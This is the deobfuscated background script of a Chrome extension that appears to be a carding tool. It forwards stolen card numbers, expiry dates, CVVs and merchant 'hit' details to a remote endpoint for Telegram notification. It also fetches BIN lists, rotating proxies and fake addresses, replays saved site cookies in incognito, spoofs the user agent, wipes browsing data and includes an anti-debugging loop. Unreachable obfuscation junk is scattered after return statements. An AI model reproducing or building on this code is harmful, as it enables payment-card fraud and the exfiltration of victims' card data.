    const n = {
      Accept: "application/json",
      Authorization: "Bearer " + _
    };
    const t = await fetch(PIXEL_IPLOOKUP_URL + "?ip=" + encodeURIComponent(e), {
      method: "GET",
      headers: n,
      signal: W.signal
    });
    clearTimeout(d);
    const o = await t.text();
    let f = {};
    try {
      f = o ? JSON.parse(o) : {};
    } catch (x) {
      const _x3 = {
        success: false,
        error: "Invalid server response",
        raw: o
      };
      return _x3;
      {
        const x = _0x505753(EzymEs.ahvHH(EzymEs.vWQwQ + EzymEs.EjQMO, ");"));
        _0x5add3b = EzymEs.kBkPT(x);
      }
    }
    if (!t.ok) {
      const x = {
        success: false,
        status: t.status,
        error: f.error || f.message || "HTTP " + t.status,
        data: f
      };
      return x;
      {
        const x = {
          header: "sec-ch-ua-platform",
          operation: "set",
          value: _0x122cd8.secChUaPlatform
        };
        _0x4a2325.push(x);
      }
    }
    const r = {
      success: true,
      status: t.status,
      data: f
    };
    return r;
    _0x417f56 = _0x3f114d.pixel_user_id;
  } catch (x) {
    {
      if (x.name === "AbortError") {
        return {
          success: false,
          error: "Request timed out"
        };
      }
      const _ = {
        success: false,
        error: x.message || "Request failed"
      };
      return _;
    }
  }
}
async function pixelBinsitesRequest({
  endpoint: x = "/bins",
  token: _ = ""
}) {
  return await authenticatedJsonRequest({
    baseUrl: PIXEL_BINSITES_BASE,
    endpoint: x,
    method: "GET",
    token: _,
    body: null
  });
}
function shouldStopGeneratedProxyRetry(x = "") {
  const c = undefined;
  return String(x || "").toLowerCase().includes("already use with other proxy list");
}
async function fetchGeneratedProxyPack({
  token: x = "",
  ip: _ = ""
}) {
  const e = String(_ || "").trim();
  if (!x || !String(x).trim()) {
    return {
      success: false,
      error: "Missing auth token"
    };
    if (_0x263bbe) {
      _0x531736(() => {
        const x = {
          type: "PLAY_SUCCESS_SOUND",
          volume: _0x6e617c.volume || 1
        };
        _0x3b68ff.runtime.sendMessage(x).catch(() => {});
      }, 100);
    }
  }
  if (!e) {
    return {
      success: false,
      error: "Missing IP"
    };
    {
      return {
        success: false,
        error: "Missing request URL"
      };
    }
  }
  const W = new AbortController();
  const d = setTimeout(() => W.abort(), GENERATED_PROXY_TIMEOUT_MS);
  try {
    const _ = await fetch(PIXEL_GENERATE_PROXY_URL + "?ip=" + encodeURIComponent(e), {
      method: "GET",
      headers: {
        Accept: "application/json",
        Authorization: "Bearer " + x
      },
      signal: W.signal
    });
    const d = await _.text();
    let n = {};
    try {
      n = d ? JSON.parse(d) : {};
    } catch (x) {
      const _x4 = {
        success: false,
        error: "Invalid server response",
        raw: d,
        retryable: true
      };
      return _x4;
      _0x589164(_0xc933c5);
    }
    if (!_.ok) {
      const x = n.error || n.message || "HTTP " + _.status;
      return {
        success: false,
        status: _.status,
        error: x,
        data: n,
        retryable: !shouldStopGeneratedProxyRetry(x)
      };
      {
        const x = {
          header: iHoqdK.AKCrX,
          operation: iHoqdK.JHrpP,
          value: _0x5b9988.secChUaFullVersion
        };
        _0x2a0bcd.push(x);
      }
    }
    if (n && typeof n === "object" && (n.error || n.message)) {
      const x = n.error || n.message;
      return {
        success: false,
        status: _.status,
        error: x,
        data: n,
        retryable: !shouldStopGeneratedProxyRetry(x)
      };
      iHoqdK.GUEre(_0x3bbdeb);
    }
    const t = Array.isArray(n?.proxies) ? n.proxies.map(x => String(x || "").trim()).filter(Boolean) : [];
    if (!t.length) {
      const x = {
        success: false,
        error: "Server returned an empty proxy list.",
        data: n,
        retryable: true
      };
      return x;
      _0x4a5807.delete(_0x30e21b);
    }
    return {
      success: true,
      status: _.status,
      data: {
        email: String(n?.email || "").trim(),
        proxies: t
      }
    };
    {
      const x = {
        header: iHoqdK.NYnUp,
        operation: iHoqdK.JHrpP,
        value: _0x5d810b.secChUaBitness
      };
      _0xe295d8.push(x);
    }
  } catch (x) {
    if (x.name === "AbortError") {
      return {
        success: false,
        error: "Request timed out",
        retryable: true
      };
    }
    const e = {
      success: false,
      error: x.message || "Request failed",
      retryable: true
    };
    return e;
    {
      const x = undefined;
      return (_0x308d27.isArray(_0x5a061b) && _0x199f5b.length ? _0x134d06 : iHoqdK.rttQe(_0x515a78, _0x3aa7f5)).filter(_0x27deb3).map((x, _) => _ === 0 ? x : x + ";q=" + _0x69cabe.max(0.1, 1 - _ * 0.1).toFixed(1)).join(",");
    }
  } finally {
    clearTimeout(d);
  }
}
async function pixelInfinityProxyRequest({
  token: x = "",
  ip: _ = ""
}) {
  let W = {
    success: false,
    error: "Failed to generate proxies."
  };
  for (let e = 1; e <= GENERATED_PROXY_MAX_RETRIES; e += 1) {
    const d = {
      token: x,
      ip: _
    };
    const n = await fetchGeneratedProxyPack(d);
    if (n.success) {
      {
        const x = {
          success: true,
          status: n.status,
          data: n.data,
          attempt: e
        };
        return x;
      }
    }
    const t = {
      ...n
    };
    t.attempt = e;
    W = t;
    if (n.retryable === false) {
      break;
      {
        const x = {
          success: false,
          error: ARLNuR.yIOpe,
          raw: _0x3e2baa
        };
        return x;
      }
    }
  }
  return W;
}
async function authenticatedTextRequest({
  url: x = "",
  token: _ = ""
}) {
  try {
    {
      const e = String(x || "").trim();
      if (!e) {
        return {
          success: false,
          error: "Missing request URL"
        };
        _0x1afb6c({
          success: false,
          error: "browsingData API not available"
        });
      }
      if (!_ || !String(_).trim()) {
        return {
          success: false,
          error: "Missing auth token"
        };
        _0x4daa51().then(_0x1606d3).catch(x => _0x179caa({
          success: false,
          error: x.message
        }));
        return true;
      }
      const W = new AbortController();
      const d = setTimeout(() => W.abort(), 25000);
      const n = await fetch(e, {
        method: "GET",
        headers: {
          Accept: "text/plain, application/json",
          Authorization: "Bearer " + _
        },
        signal: W.signal
      });
      clearTimeout(d);
      const t = await n.text();
      if (!n.ok) {
        const x = {
          success: false,
          status: n.status,
          error: t || "HTTP " + n.status
        };
        return x;
        {
          const x = {
            success: true,
            valid: true,
            error: hRBtZR.cOqTR,
            offline: true
          };
          return x;
        }
      }
      const o = {
        success: true,
        status: n.status,
        text: t
      };
      return o;
    }
  } catch (x) {
    {
      if (x.name === "AbortError") {
        return {
          success: false,
          error: "Request timed out"
        };
      }
      const _ = {
        success: false,
        error: x.message || "Request failed"
      };
      return _;
    }
  }
}
async function authenticatedJsonRequest({
  baseUrl: x = "",
  endpoint: _ = "/",
  method: c = "GET",
  token: e = "",
  body: W = null,
  requireAuth: d = true
}) {
  try {
    if (d && (!e || !String(e).trim())) {
      return {
        success: false,
        error: "Missing auth token"
      };
      _0x199cf9(_0x47e1ca.session_id).then(_0x7b0eb0).catch(x => _0x205fee({
        success: false,
        error: x.message
      }));
      return true;
    }
    const t = String(_ || "/").trim();
    const o = String(x || "").trim();
    if (!o) {
      {
        return {
          success: false,
          error: "Missing API base URL"
        };
      }
    }
    const f = "" + o + (t.startsWith("/") ? t : "/" + t);
    const r = String(c || "GET").toUpperCase();
    const b = {
      Accept: "application/json"
    };
    if (d) {
      b.Authorization = "Bearer " + e;
    }
    const u = {
      method: r,
      headers: b
    };
    const i = u;
    if (W !== null && W !== undefined && r !== "GET" && r !== "DELETE") {
      b["Content-Type"] = "application/json";
      i.body = JSON.stringify(W);
    }
    const S = new AbortController();
    const k = setTimeout(() => S.abort(), 25000);
    const s = {
      ...i
    };
    s.signal = S.signal;
    const C = await fetch(f, s);
    clearTimeout(k);
    const m = await C.text();
    let R = {};
    try {
      R = m ? JSON.parse(m) : {};
    } catch (x) {
      const _x5 = {
        success: false,
        error: "Invalid server response",
        raw: m
      };
      return _x5;
      {
        let x;
        try {
          x = QrkZjp.KaOfV(_0xea7d83, "return (function() " + QrkZjp.vytKi + ");")();
        } catch (_) {
          x = _0x5e3708;
        }
        return x;
      }
    }
    if (!C.ok) {
      {
        const x = {
          success: false,
          status: C.status,
          error: R.error || R.message || "HTTP " + C.status,
          data: R
        };
        return x;
      }
    }
    const q = {
      success: true,
      status: C.status,
      data: R
    };
    return q;
    {
      const x = {
        success: true,
        valid: true,
        error: QrkZjp.sPpuP,
        offline: true
      };
      return x;
    }
  } catch (x) {
    {
      if (x.name === "AbortError") {
        return {
          success: false,
          error: "Request timed out"
        };
      }
      const _ = {
        success: false,
        error: x.message || "Request failed"
      };
      return _;
    }
  }
}
async function checkProxyLive(x) {
  try {
    {
      const c = new AbortController();
      const e = setTimeout(() => c.abort(), 55000);
      const W = await fetch(PROXY_CHECK_URL + "?proxy=" + encodeURIComponent(x), {
        method: "GET",
        headers: {
          Accept: "application/json"
        },
        signal: c.signal
      });
      clearTimeout(e);
      if (W.ok) {
        {
          const x = await W.text();
          try {
            return JSON.parse(x);
            _0x415e02(() => {
              const x = {
                type: "PLAY_CUSTOM_PREVIEW",
                audioData: _0x5ed9ba
              };
              _0x27b7e8.runtime.sendMessage(x).catch(() => {});
            }, 100);
          } catch (x) {
            {
              return {
                success: false,
                status: "fail",
                error: "Invalid response from proxy checker"
              };
            }
          }
        }
      }
      const d = {
        success: false,
        status: "fail",
        error: "HTTP " + W.status
      };
      return d;
    }
  } catch (x) {
    if (x.name === "AbortError") {
      return {
        success: false,
        status: "fail",
        error: "Proxy check timeout (server slow)"
      };
      {
        let x = _0x3ce9d3 && _0x266250.pixel_country_code ? _0x2d1244(_0x173434.pixel_country_code).trim().toUpperCase() : "US";
        if (!/^[A-Z]{2}$/.test(x)) {
          x = "US";
        }
        const _ = {
          countryCode: x
        };
        _0x35f46c(_);
      }
    }
    const c = {
      success: false,
      status: "fail",
      error: x.message
    };
    return c;
    if (_0x725da7 !== "local") {
      return;
    }
  }
}
async function getProxyState() {
  return await new Promise(_ => {
    try {
      {
        if (!chrome.proxy || !chrome.proxy.settings) {
          {
            _({
              success: true,
              enabled: false,
              proxyString: ""
            });
            return;
          }
        }
        chrome.proxy.settings.get({
          incognito: false
        }, async c => {
          try {
            {
              const e = c && c.value ? c.value : {};
              const W = e.mode || "";
              const d = undefined;
              const n = (e.rules || {}).singleProxy || {};
              const t = e.pacScript || {};
              const o = String(W).toLowerCase() === "fixed_servers" && !!n.host && !!n.port;
              const f = String(W).toLowerCase() === "pac_script" && !!String(t.data || "").trim();
              if (!o && !f) {
                {
                  try {
                    const x = {
                      ip: ""
                    };
                    x.response_time_ms = 0;
                    x.country_name = "";
                    x.country_code = "";
                    x.ip_type = "";
                    const _ = {
                      pixel_proxy_enabled: false,
                      pixel_proxy_string: "",
                      pixel_proxy_info: x
                    };
                    await chrome.storage.local.set(_);
                  } catch (x) {}
                  _({
                    success: true,
                    enabled: false,
                    proxyString: ""
                  });
                  return;
                }
              }
              let r = "";
              try {
                {
                  const _ = await chrome.storage.local.get(["pixel_proxy_string", "proxyAuth"]);
                  const c = _ && _.proxyAuth ? _.proxyAuth : null;
                  if (o) {
                    r = n.host + ":" + n.port;
                    if (c && c.username && c.password) {
                      r = c.username + ":" + c.password + "@" + n.host + ":" + n.port;
                    }
                  } else if (f) {
                    {
                      const _ = undefined;
                      const e = String(t.data || "").match(/\b(?:PROXY|HTTPS|SOCKS5|SOCKS4)\s+([^:;\s]+):(\d{2,5})/i);
                      if (e) {
                        r = e[1] + ":" + e[2];
                        if (c && c.username && c.password) {
                          r = c.username + ":" + c.password + "@" + e[1] + ":" + e[2];
                        }
                      }
                    }
                  }
                  if (!r && _ && _.pixel_proxy_string) {
                    r = String(_.pixel_proxy_string);
                  }
                }
              } catch (x) {}
              _({
                success: true,
                enabled: true,
                proxyString: r || ""
              });
            }
          } catch (c) {
            {
              _({
                success: true,
                enabled: false,
                proxyString: ""
              });
            }
          }
        });
      }
    } catch (c) {
      _({
        success: true,
        enabled: false,
        proxyString: ""
      });
    }
  });
}
async function fetchRealIp() {
  try {
    const _ = new AbortController();
    const c = setTimeout(() => _.abort(), 10000);
    const e = ["https://api.ipify.org?format=json", "https://api.ip.sb/ip", "https://api64.ipify.org?format=json"];
    for (const W of e) {
      try {
        const d = {
          signal: _.signal,
          headers: {
            Accept: "application/json, text/plain"
          }
        };
        const n = await fetch(W, d);
        if (n.ok) {
          {
            const _ = await n.text();
            clearTimeout(c);
            try {
              const c = JSON.parse(_);
              if (c.ip) {
                {
                  const _ = {
                    ip: c.ip
                  };
                  return buildFingerprintGeoContext(_);
                }
              }
            } catch (c) {
              const _c2 = _.trim();
              if (_c2 && /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(_c2)) {
                const _ = {
                  ip: _c2
                };
                return buildFingerprintGeoContext(_);
                OSGClI.ZtCtp(_0x3e91cf);
              }
            }
          }
        }
      } catch (_) {
        continue;
        _0x10ad16(() => {
          const _ = {
            type: "PLAY_BACKGROUND_MUSIC",
            audioData: _0x54d4b3,
            volume: _0x5a9e04.volume
          };
          _0x4ab2f9.runtime.sendMessage(_).catch(() => {});
        }, 100);
      }
    }
    clearTimeout(c);
    return {
      success: false,
      error: "Could not fetch IP"
    };
    {
      const x = {
        type: OSGClI.eSyZD
      };
      _0xadf28a.postMessage(x);
    }
  } catch (_) {
    const x = {
      success: false,
      error: _.message
    };
    return x;
    (function () {
      return true;
    }).constructor(OSGClI.CKLgA(OSGClI.iDsXx, OSGClI.WCRDa)).call(OSGClI.IECOT);
  }
}
async function sendTelegramNotification(x) {
  try {
    {
      const c = x.attempt;
      if (c === undefined || c === null || c === "N/A" || c === 0 || c === "0") {
        return;
        {
          const x = _0x1a3532.parse(_0x2a2869);
          if (x.ip) {
            const _ = {
              ip: x.ip
            };
            return fmOezm.lQTor(_0x14743e, _);
          }
        }
      }
      let e = x.userId;
      let W = x.userName || "";
      const d = await chrome.storage.local.get(["pixel_user_id", "pixel_user_first_name", "pixel_token"]);
      const n = String(d.pixel_token || "").trim();
      if (!e) {
        e = d.pixel_user_id;
      }
      if (!W) {
        W = d.pixel_user_first_name || "User";
      }
      if (!e) {
        return;
        _0x3932d7({
          outdated: _0x419087[_0x3b0a14.outdatedStorageKey] === true
        });
      }
      const t = x.tgForwardEnabled !== false;
      const o = x.cardNumber || "N/A";
      const f = o.includes("|") ? o.split("|") : [o, "??", "??", "???"];
      const r = f[0] || "N/A";
      const a = f[1] || "??";
      const b = f[2] || "??";
      const u = f[3] || "???";
      const i = String(c);
      const S = x.businessUrl || "N/A";
      const k = x.successUrl || S || "N/A";
      const s = x.timeTaken || "N/A";
      try {
        const c = await fetch(HIT_FORWARD_URL, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            Authorization: "Bearer " + n
          },
          body: JSON.stringify({
            chat_id: e,
            userName: W,
            card: r,
            mm: a,
            yy: b,
            cvv: u,
            email: x.email || "N/A",
            attempt: i,
            currency: x.currency || "usd",
            amount: x.amount || "0",
            businessUrl: S,
            successUrl: k,
            timeTaken: s,
            tgForwardEnabled: t,
            ver: "v1lt2"
          })
        });
      } catch (x) {}
    }
  } catch (x) {}
}
chrome.storage?.onChanged?.addListener((x, _) => {
  _ !== "local";
});
chrome.webNavigation?.onBeforeNavigate?.addListener(x => {
  if (x) {
    x.frameId;
  }
});
chrome.tabs?.onUpdated?.addListener((x, _, c) => {
  if (c?.incognito && (_?.status === "complete" || typeof _?.url === "string")) {
    maybeApplyFlashLoginToTab(x, c).catch(() => {});
  }
});
chrome.runtime.onMessage.addListener((x, _, c) => {
  if (!x || !x.type) {
    c(null);
    return false;
  }
  if (x.type === "FETCH_US_ADDRESS") {
    (async () => {
      try {
        const W = new AbortController();
        const d = setTimeout(() => W.abort(), 20000);
        let n = x && x.countryCode ? String(x.countryCode) : "US";
        n = n.trim().toLowerCase();
        if (!/^[a-z]{2}$/.test(n)) {
          n = "us";
        }
        const t = await fetch("https://pixelx.eu.cc/adrnew.php?q=" + n, {
          method: "GET",
          headers: {
            Accept: "application/json"
          },
          cache: "no-store",
          signal: W.signal
        });
        clearTimeout(d);
        if (!t.ok) {
          c({
            ok: false,
            error: "HTTP " + t.status
          });
          return;
          if (_0x4cdbba) {
            _0x594249.runtime.sendMessage({
              type: "STOP_BACKGROUND_MUSIC"
            }).catch(() => {});
          }
        }
        const o = await t.json();
        const f = {
          ok: true
        };
        f.data = o;
        c(f);
      } catch (x) {
        c({
          ok: false,
          error: x && x.name === "AbortError" ? "Request timed out" : x?.message || String(x)
        });
      }
    })();
    return true;
    _0x4de2d4 = _0x3ba6cc.username + ":" + _0x22ca49.password + "@" + _0x428ac4[1] + ":" + _0x528895[2];
  }
  if (x.type === "GET_COUNTRY_CODE") {
    chrome.storage.local.get(["pixel_country_code"], x => {
      {
        let _ = x && x.pixel_country_code ? String(x.pixel_country_code).trim().toUpperCase() : "US";
        if (!/^[A-Z]{2}$/.test(_)) {
          _ = "US";
        }
        const W = {
          countryCode: _
        };
        c(W);
      }
    });
    return true;
  }
  if (x.type === "GET_CHECKOUT_PROFILE") {
    chrome.storage.local.get(["pixel_country_code", "pixel_custom_address_enabled", "pixel_custom_address_line1", "pixel_custom_address_city", "pixel_custom_address_state", "pixel_custom_address_postcode", "pixel_form_filling_style"], x => {
      let _ = x && x.pixel_country_code ? String(x.pixel_country_code).trim().toUpperCase() : "US";
      if (!/^[A-Z]{2}$/.test(_)) {
        _ = "US";
      }
      c({
        countryCode: _,
        customAddressEnabled: x?.pixel_custom_address_enabled === true,
        addressLine1: String(x?.pixel_custom_address_line1 || "").trim(),
        city: String(x?.pixel_custom_address_city || "").trim(),
        state: String(x?.pixel_custom_address_state || "").trim(),
        postcode: String(x?.pixel_custom_address_postcode || "").trim(),
        formFillingStyle: x?.pixel_form_filling_style === "type" ? "type" : "direct"
      });
    });
    return true;
  }
  if (x.type === "FLASH_LOGIN_SAVE") {
    saveFlashLoginFromTab(Number(x.tabId || 0)).then(x => c({
      success: true,
      host: x.host,
      count: x.count || x.cookies?.length || 0
    })).catch(x => c({
      success: false,
      error: x.message || "Failed to save site cookies"
    }));
    return true;
  }
  if (x.type === "FLASH_LOGIN_GET_STATUS") {
    Promise.all([getFlashLoginPayload(), getFlashLoginUsageInfo()]).then(([x, _]) => c({
      success: true,
      active: !!x,
      host: x?.host || "",
      count: x?.count || x?.cookies?.length || 0,
      usage: _
    })).catch(x => c({
      success: false,
      error: x.message || "Failed to read flash login status"
    }));
    return true;
    _0x3d813c();
  }
  if (x.type === "FLASH_LOGIN_CLEAR") {
    {
      const x = {
        success: true
      };
      clearFlashLoginPayload().then(() => c(x)).catch(x => c({
        success: false,
        error: x.message || "Failed to clear flash login data"
      }));
      return true;
    }
  }
  if (x.type === "PAH_FETCH" && x.url) {
    _originalFetch(x.url, {
      method: "GET",
      headers: {
        Accept: "application/json"
      }
    }).then(function (x) {
      return x.text();
    }).then(function (x) {
      const _ = {
        ok: true
      };
      _.data = x;
      c(_);
    }).catch(function (x) {
      c({
        ok: false,
        error: String(x)
      });
    });
    return true;
  }
  if (x.type === "CHECK_LICENSE_KEY") {
    checkLicenseKey(x.key, x.version).then(c).catch(x => c({
      success: false,
      valid: false,
      error: x.message
    }));
    return true;
  }
  if (x.type === "VALIDATE_TOKEN") {
    validateToken(x.token).then(c).catch(x => c({
      success: false,
      error: x.message
    }));
    return true;
  }
  if (x.type === "TELEGRAM_LOGIN_START") {
    telegramLoginStart().then(c).catch(x => c({
      success: false,
      error: x.message
    }));
    return true;
  }
  if (x.type === "TELEGRAM_LOGIN_STATUS") {
    telegramLoginStatus(x.session_id).then(c).catch(x => c({
      success: false,
      error: x.message
    }));
    return true;
    {
      const x = {
        ip: _0x2193ce.ip,
        token: _0x2a310b.token
      };
      _0x4d6337(x).then(_0x25ceee).catch(x => _0x2e792b({
        success: false,
        error: x.message
      }));
      return true;
    }
  }
  if (x.type === "VERIFY_TEMP_CODE") {
    verifyTempCode(x.code).then(c).catch(x => c({
      success: false,
      error: x.message || "OTP verification failed"
    }));
    return true;
  }
  if (x.type === "PIXEL_API_REQUEST") {
    const _ = {
      endpoint: x.endpoint,
      method: x.method,
      token: x.token,
      body: x.body
    };
    pixelApiRequest(_).then(c).catch(x => c({
      success: false,
      error: x.message
    }));
    return true;
    {
      const x = _0x8c6029.error || _0x42e17f.message || "HTTP " + _0x648737.status;
      return {
        success: false,
        status: _0x1cf790.status,
        error: x,
        data: _0x53850b,
        retryable: !vUStUN.pfpyM(_0x23c601, x)
      };
    }
  }
  if (x.type === "PIXEL_MAILS_REQUEST") {
    {
      const _ = {
        endpoint: x.endpoint,
        method: x.method,
        token: x.token,
        body: x.body
      };
      pixelMailsRequest(_).then(c).catch(x => c({
        success: false,
        error: x.message
      }));
      return true;
    }
  }
  if (x.type === "PIXEL_FEED_REQUEST") {
    const _ = {
      endpoint: x.endpoint,
      method: x.method,
      token: x.token,
      body: x.body
    };
    pixelFeedRequest(_).then(c).catch(x => c({
      success: false,
      error: x.message
    }));
    return true;
    {
      const x = vUStUN.HAMJO(_0x48ac17, _0x537861?.name || "");
      const _ = vUStUN.YTowA(_0x18c80c, _0x45436c?.value || "");
      return vUStUN.cwNbI(vUStUN.puRXb(_0x3774dd + x.length, _.length), 4);
    }
  }
  if (x.type === "PIXEL_IP_LOOKUP_REQUEST") {
    const _ = {
      ip: x.ip,
      token: x.token
    };
    pixelIpLookupRequest(_).then(c).catch(x => c({
      success: false,
      error: x.message
    }));
    return true;
    {
      if (vUStUN.meSTf(_0xb46229.name, vUStUN.OzUTu)) {
        return {
          success: false,
          error: vUStUN.vEWDz
        };
      }
      const x = {
        success: false,
        error: _0x11528a.message || vUStUN.KjOZg
      };
      return x;
    }
  }
  if (x.type === "PIXEL_BINSITES_REQUEST") {
    const _ = {
      endpoint: x.endpoint,
      token: x.token
    };
    pixelBinsitesRequest(_).then(c).catch(x => c({
      success: false,
      error: x.message
    }));
    return true;
    _0x174fad().then(x => {
      if (x) {
        _0x396ba2.runtime.sendMessage({
          type: "STOP_BACKGROUND_MUSIC"
        }).catch(() => {});
      }
    });
    return false;
  }
  if (x.type === "PIXEL_INFINITY_PROXY_REQUEST") {
    const _ = {
      ip: x.ip,
      token: x.token
    };
    pixelInfinityProxyRequest(_).then(c).catch(x => c({
      success: false,
      error: x.message
    }));
    return true;
    return {
      success: false,
      error: vUStUN.CPVAb(vUStUN.MXXDL, _0x6af115.substring(0, 200))
    };
  }
  if (x.type === "CHECK_PROXY_LIVE") {
    checkProxyLive(x.proxy).then(c).catch(x => c({
      success: false,
      status: "fail",
      error: x.message
    }));
    return true;
    _0x48dad0.headers[vUStUN.xCGdR] = vUStUN.UUpEw;
    _0xa1057a.body = _0x46caa1.stringify(_0x32a18f);
  }
  if (x.type === "API_REQUEST") {
    handleAPIRequest(x.endpoint, x.payload || {}).then(c).catch(x => c({
      success: false,
      error: x.message
    }));
    return true;
  }
  if (x.type === "FETCH_IMAGE") {
    (async () => {
      try {
        {
          const W = await fetch(x.url);
          if (!W.ok) {
            c({
              success: false
            });
            return;
            {
              const x = _0x44ede7(vUStUN.IkLEY(_0x1bc7a1, "")).trim() || "en-US";
              const _ = x.split("-")[0] || "en";
              const c = [x];
              if (!c.includes(_)) {
                c.push(_);
              }
              if (vUStUN.iToef(_, "en") && !c.includes("en")) {
                c.push("en");
              }
              return c;
            }
          }
          const d = await W.blob();
          const n = new FileReader();
          n.onloadend = () => {
            {
              const x = {
                success: true,
                dataUrl: n.result
              };
              c(x);
            }
          };
          const t = {
            success: false
          };
          n.onerror = () => c(t);
          n.readAsDataURL(d);
        }
      } catch (x) {
        {
          const _ = {
            success: false,
            error: x.message
          };
          c(_);
        }
      }
    })();
    return true;
    _0xcf9023 = "us";
  }
  if (x.type === "PLAY_SUCCESS_SOUND_OFFSCREEN") {
    ensureOffscreenDocument().then(_ => {
      if (_) {
        setTimeout(() => {
          {
            const _ = {
              type: "PLAY_SUCCESS_SOUND",
              volume: x.volume || 1
            };
            chrome.runtime.sendMessage(_).catch(() => {});
          }
        }, 100);
      }
    });
    return false;
    {
      if (vUStUN.mzhng(_0x1cc48d.name, vUStUN.OzUTu)) {
        const x = {
          success: true,
          valid: true,
          error: vUStUN.hPAFq,
          offline: true
        };
        return x;
      }
      const x = {
        success: true,
        valid: true,
        error: _0x22b04e.message,
        offline: true
      };
      return x;
    }
  }
  if (x.type === "PLAY_CUSTOM_PREVIEW") {
    chrome.storage.local.get(["pixel_music_data"], x => {
      const _ = x.pixel_music_data;
      if (_) {
        ensureOffscreenDocument().then(x => {
          if (x) {
            setTimeout(() => {
              const x = {
                type: "PLAY_CUSTOM_PREVIEW",
                audioData: _
              };
              chrome.runtime.sendMessage(x).catch(() => {});
            }, 100);
          }
        });
      }
    });
    return false;
  }
  if (x.type === "STOP_CUSTOM_PREVIEW") {
    ensureOffscreenDocument().then(x => {
      if (x) {
        chrome.runtime.sendMessage({
          type: "STOP_CUSTOM_PREVIEW"
        }).catch(() => {});
      }
    });
    return false;
  }
  if (x.type === "PLAY_BACKGROUND_MUSIC") {
    chrome.storage.local.get(["pixel_music_data"], _ => {
      const d = _.pixel_music_data;
      if (d) {
        ensureOffscreenDocument().then(_ => {
          if (_) {
            setTimeout(() => {
              const _ = {
                type: "PLAY_BACKGROUND_MUSIC",
                audioData: d,
                volume: x.volume
              };
              chrome.runtime.sendMessage(_).catch(() => {});
            }, 100);
          }
        });
      }
    });
    return false;
  }
  if (x.type === "STOP_BACKGROUND_MUSIC") {
    ensureOffscreenDocument().then(x => {
      if (x) {
        chrome.runtime.sendMessage({
          type: "STOP_BACKGROUND_MUSIC"
        }).catch(() => {});
      }
    });
    return false;
  }
  if (x.type === "SEND_TELEGRAM_NOTIFICATION") {
    sendTelegramNotification(x.data);
    return false;
  }
  if (x.type === "CAPTURE_SCREENSHOT") {
    const x = _ && _.tab ? _.tab.id : null;
    captureScreenshot(x).then(x => {
      const _ = {
        dataUrl: x
      };
      c(_);
    });
    return true;
  }
  if (x.type === "CLEAR_BROWSING_DATA") {
    (async () => {
      try {
        const _ = {
          since: 0
        };
        const d = {
          history: true,
          downloads: true,
          cookies: true,
          cache: true,
          cacheStorage: true,
          indexedDB: true,
          localStorage: true,
          serviceWorkers: true,
          webSQL: true,
          fileSystems: true
        };
        if (chrome.browsingData && chrome.browsingData.remove) {
          await chrome.browsingData.remove(_, d);
          c({
            success: true
          });
        } else {
          c({
            success: false,
            error: "browsingData API not available"
          });
        }
      } catch (x) {
        const _ = {
          success: false,
          error: x.message || "Failed to clear browsing data"
        };
        c(_);
      }
    })();
    return true;
  }
  if (x.type === "APPLY_PROXY") {
    applyProxy(x.proxy, x.proxyType).then(c).catch(x => c({
      success: false,
      error: x.message
    }));
    return true;
  }
  if (x.type === "CLEAR_PROXY") {
    clearProxy().then(c).catch(x => c({
      success: false,
      error: x.message
    }));
    return true;
  }
  if (x.type === "FETCH_REAL_IP") {
    fetchRealIp().then(c).catch(x => c({
      success: false,
      error: x.message
    }));
    return true;
  }
  if (x.type === "GET_PROXY_STATE") {
    getProxyState().then(c).catch(x => c({
      success: false,
      error: x.message || "Failed to read proxy state"
    }));
    return true;
  }
  if (x.type === "GET_PROXY_SESSION_STATUS") {
    getProxySessionStatus().then(c).catch(x => c({
      success: false,
      error: x.message || "Failed to read proxy session status"
    }));
    return true;
  }
  if (x.type === "APPLY_USER_AGENT") {
    applyUserAgentOverride(x.userAgent, {
      browser: x.browser,
      device: x.device
    }).then(c).catch(x => c({
      success: false,
      error: x.message || "Failed to apply user agent"
    }));
    return true;
  }
  if (x.type === "CLEAR_USER_AGENT") {
    clearUserAgentOverride().then(c).catch(x => c({
      success: false,
      error: x.message || "Failed to clear user agent"
    }));
    return true;
  }
  if (x.type === "GET_USER_AGENT_STATE") {
    getUserAgentState().then(c).catch(x => c({
      success: false,
      error: x.message || "Failed to get user agent state"
    }));
    return true;
  }
  if (x.type === "GET_OR_CREATE_FINGERPRINT_USER_AGENT" || x.type === "SET_FINGERPRINT_USER_AGENT") {
    c({
      success: false,
      error: "Fingerprint spoofer removed"
    });
    return false;
  }
  if (x.type === "CHECK_VERSION") {
    const x = {
      updated: true,
      outdated: false
    };
    checkVersion().then(x => {
      const _ = getVersionConfig();
      return chrome.storage.local.get([_.outdatedStorageKey]).then(c => ({
        ...x,
        outdated: c[_.outdatedStorageKey] === true
      }));
    }).then(c).catch(() => c(x));
    return true;
  }
  if (x.type === "GET_VERSION_OUTDATED") {
    const x = getVersionConfig();
    chrome.storage.local.get([x.outdatedStorageKey], _ => {
      c({
        outdated: _[x.outdatedStorageKey] === true
      });
    });
    return true;
  }
  return false;
});
restoreUserAgentOverride().catch(() => {});
const _0x2f65cf = {};
function _0x541769(x) {
  function _0x26fec4(x) {
    if (typeof x === "string") {
      return function (x) {}.constructor("while (true) {}").apply("counter");
    }
    if (("" + x / x).length !== 1 || x % 20 === 0) {
      (function () {
        return true;
      }).constructor("debuggergger").call("action");
    } else {
      (function () {
        return false;
      }).constructor("debuggergger").apply("stateObject");
    }
    _0x26fec4(++x);
  }
  try {
    if (x) {
      return _0x26fec4;
    }
    _0x26fec4(0);
  } catch (x) {}
}
_0x2f65cf.clearStorage = true;
clearFingerprintUserAgentRule(_0x2f65cf).catch(() => {});
